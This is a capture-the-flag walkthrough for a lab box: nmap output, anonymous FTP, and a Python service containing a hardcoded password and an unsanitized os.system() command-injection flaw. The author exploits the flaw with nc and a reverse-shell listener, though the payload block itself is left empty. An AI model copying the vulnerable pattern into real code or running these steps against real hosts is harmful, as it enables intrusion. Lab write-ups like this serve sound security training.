# The Dark Knight's Hotline

## Intel

Scan the target with nmap:

```
nmap -Pn -sC -sV <ip>
```

**Output:**

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rwxr-xr-x    1 0        0            1115 Jul 23 13:42 alert.py
|_drwxrwxrwx    1 0        0            4096 Jul 23 13:42 logs [NSE: writeable]
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
3000/tcp open  ppp?
| fingerprint-strings:
|   Gotham Hotline: Identify yourself.
|   Unauthorized signal. Transmission terminated.
```

Three ports stand out: FTP with anonymous login, SSH, and a mystery service on 3000 answering with `Gotham Hotline: Identify yourself.`

## Connect

Since there is a stp port, we log in:

```
ftp <ip>
```

## Explore

Listing the root of the FTP share:

```
lftp <ip>:~> ls
-rwxr-xr-x    1 0        0            1115 Jul 23 13:42 alert.py
drwxrwxrwx    1 0        0            4096 Jul 23 13:42 logs
```

We grab the source of the mystery service:

```
lftp <ip>:/> cat alert.py
```

**Output:**

```python
#!/usr/bin/env python3

import os
import socket
import time

HOST = "0.0.0.0"
PORT = 3000

def handle_client(conn, addr):
    conn.send("Gotham Hotline: Identify yourself.\n$> ".encode("utf-8"))

    data = conn.recv(1024).strip().decode()

    if data == "G0th4mN33dsTh3B4t!":
        conn.send(b'Authorized signal. What is the emergency?\n$> ')
        alert_text = conn.recv(1024).strip().decode()
        os.system("bash -c 'echo %s > /opt/hotline/logs/report.txt'" % alert_text)
        conn.send(b"Alert received. Mobilizing Knightfall Protocol.\n")
        time.sleep(1)
        conn.send(b"Batmobile deployed.\n")
    else:
        conn.send(b"Unauthorized signal. Transmission terminated.\n")

    conn.close()
```

Two findings:

- The service on port 3000 authenticates with the hardcoded string `G0th4mN33dsTh3B4t!`
- After authenticating, `alert_text` is passed **unsanitized** straight into `os.system()`, wrapped inside single quotes — a textbook command injection.

## Exploit

Connect to the hotline service:

```
nc <ip> 3000
```

Authenticate with the hardcoded token:

```
G0th4mN33dsTh3B4t!
```

Break out of the single-quoted `echo` and chain a reverse shell as the "emergency" message:

```

```

Start a listener beforehand on the attacking machine:

```
nc -lvnp 4444
```

## Shell

Since we got access to the person's shell : 

```
cat /home/bruce/user.txt
```